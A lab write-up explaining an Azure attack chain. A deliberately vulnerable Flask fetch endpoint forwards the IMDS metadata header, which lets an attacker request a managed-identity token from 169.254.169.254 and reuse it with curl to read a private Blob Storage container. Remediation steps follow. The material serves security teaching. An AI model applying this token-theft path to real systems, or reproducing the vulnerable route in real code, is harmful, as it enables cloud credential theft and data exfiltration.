# 🧪 Lab Writeup: Azure SSRF & IMDS Token Exfiltration

## Executive Summary
This lab demonstrates a critical vulnerability chain in Azure-hosted environments. An attacker uses a Server-Side Request Forgery (SSRF) vulnerability on a web application to steal an OAuth2 token from the internal **Instance Metadata Service (IMDS)**, which is then used to exfiltrate data from a private **Azure Storage Account**.

---

## 1. Vulnerability: Insecure Server-Side Requests (SSRF)
The core vulnerability exists in `app.py`. The application allows users to provide an external URL which the server then fetches on the user's behalf.

```python
# Vulnerable Snippet
@app.route("/fetch")
def fetch():
    url = request.args.get("url")
    headers = {"Metadata": "true"} # Required by Azure IMDS
    r = requests.get(url, headers=headers, timeout=5)
    return r.text
```

### The Twist: Bypassing IMDS Protections
Normally, Azure's IMDS requires a special HTTP header (`Metadata: true`) to prevent simple SSRF attacks. However, in this lab, the application **intentionally attaches** that header, simulating a scenario where a developer has tried to "integrate" with Azure features, or where an attacker can control headers.

---

## 2. Exploitation Path

### Phase A: Identity Extraction
The attacker targets the **Identity Endpoint** of the IMDS at `169.254.169.254`. This IP is unreachable from the internet but is fully accessible to the "insider" web app.

**Target URL:**
`http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/`

The server fetches this URL and returns a JSON object containing an `access_token`.

### Phase B: Token Abuse
The attacker takes the stolen token and uses it locally. Because it is a standard JWT, the attacker now effectively **impersonates the VM's Managed Identity**.

### Phase C: Data Exfiltration
The Azure Storage account is configured with a **private** container. However, the VM's Managed Identity has been over-privileged with the `Storage Blob Data Contributor` role.

The attacker uses the token to call the Storage REST API:
`curl -H "Authorization: Bearer <TOKEN>" https://<ACCOUNT>.blob.core.windows.net/...`

---

## 3. Remediation
To prevent this attack, organizations should:
1.  **Sanitize Inputs**: Validate and whitelist URLs provided to the server. (ALLOWED DOMAINS)
2.  **Principle of Least Privilege**: The VM's Managed Identity should not have data-plane access to storage if it is not required for its core function.
3.  **Network Segmentation**: Use Network Security Groups (NSGs) or Application Security Groups to restrict which internal endpoints the web app can communicate with.


